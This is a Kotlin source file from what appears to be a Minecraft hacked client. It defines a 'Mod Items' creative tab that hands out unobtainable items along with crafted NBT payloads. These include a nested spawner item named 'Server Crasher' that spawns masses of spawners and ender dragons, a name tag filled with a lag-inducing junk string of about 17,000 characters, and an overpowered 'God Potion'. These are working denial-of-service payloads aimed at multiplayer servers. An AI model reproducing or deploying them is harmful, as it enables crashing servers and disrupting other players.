package net.aspw.client.features.api

import net.aspw.client.utils.item.ItemUtils
import net.minecraft.creativetab.CreativeTabs
import net.minecraft.init.Blocks
import net.minecraft.item.Item
import net.minecraft.item.ItemStack

class ModItems : CreativeTabs("Mod Items") {
    override fun displayAllReleventItems(itemList: MutableList<ItemStack>) {
        val lagStringBuilder = StringBuilder()
        for (i in 0..499)
            lagStringBuilder.append("/(!§()%/§)=/(!§()%/§)=/(!§()%/§)=")
        itemList.add(ItemUtils.createItem("barrier 64 0"))
        itemList.add(ItemUtils.createItem("command_block 64 0"))
        itemList.add(ItemUtils.createItem("command_block_minecart 64 0"))
        itemList.add(ItemUtils.createItem("dragon_egg 64 0"))
        itemList.add(ItemUtils.createItem("mob_spawner 64 0"))
        itemList.add(ItemUtils.createItem("farmland 64 0"))
        itemList.add(ItemUtils.createItem("lit_furnace 64 0"))
        itemList.add(ItemUtils.createItem("tallgrass 64 0"))
        itemList.add(ItemUtils.createItem("armor_stand 64 0 {EntityTag:{NoBasePlate:1,id:\"minecraft:armor_stand\",ShowArms:1,},}"))
        itemList.add(ItemUtils.createItem("spawn_egg 64 0"))
        itemList.add(ItemUtils.createItem("spawn_egg 64 64"))
        itemList.add(ItemUtils.createItem("spawn_egg 64 63"))
        itemList.add(ItemUtils.createItem("spawn_egg 64 53"))
        itemList.add(ItemUtils.createItem("chest 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:chest\",Lock:\"Key\",},}"))
        itemList.add(ItemUtils.createItem("trapped_chest 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:chest\",Lock:\"Key\",},}"))
        itemList.add(ItemUtils.createItem("furnace 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:furnace\",Lock:\"Key\",},}"))
        itemList.add(ItemUtils.createItem("dispenser 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:dispenser\",Lock:\"Key\",},}"))
        itemList.add(ItemUtils.createItem("dropper 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:dropper\",Lock:\"Key\",},}"))
        itemList.add(ItemUtils.createItem("hopper 64 0 {BlockEntityTag:{Items:[],id:\"minecraft:hopper\",Lock:\"Key\",},}"))
        itemList.add(ItemUtils.createItem("mob_spawner 64 0 {BlockEntityTag:{MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{entity:{Motion:[0:0.0d,1:0.0d,2:0.0d,],BlockState:{Name:\"minecraft:spawner\",},Block:\"minecraft:mob_spawner\",Time:1,id:\"minecraft:falling_block\",TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d,],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20,},DropItem:0,},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20,},DropItem:0,},},id:\"minecraft:mob_spawner\",MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5,},display:{Name:\"§4Server Crasher\",},}"))
        itemList.add(ItemUtils.createItem("potion 64 0 {CustomPotionEffects:[0:{Ambient:0b,ShowIcon:1b,ShowParticles:1b,Duration:19999980,Id:10b,Amplifier:125b,},1:{Ambient:0b,ShowIcon:1b,ShowParticles:1b,Duration:19999980,Id:11b,Amplifier:125b,},2:{Ambient:0b,ShowIcon:1b,ShowParticles:1b,Duration:19999980,Id:22b,Amplifier:4b,},],CustomPotionColor:16711680,display:{Name:\"§6God Potion\",},}"))
        itemList.add(ItemUtils.createItem("name_tag 64 0 {display:{Name: \"$lagStringBuilder\"}}"))
        itemList.add(ItemUtils.createItem("fireworks 64 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}"))
    }

    override fun getTabIconItem(): Item = ItemStack(Blocks.command_block).item
    override fun getTranslatedTabLabel() = "Mod Items"
}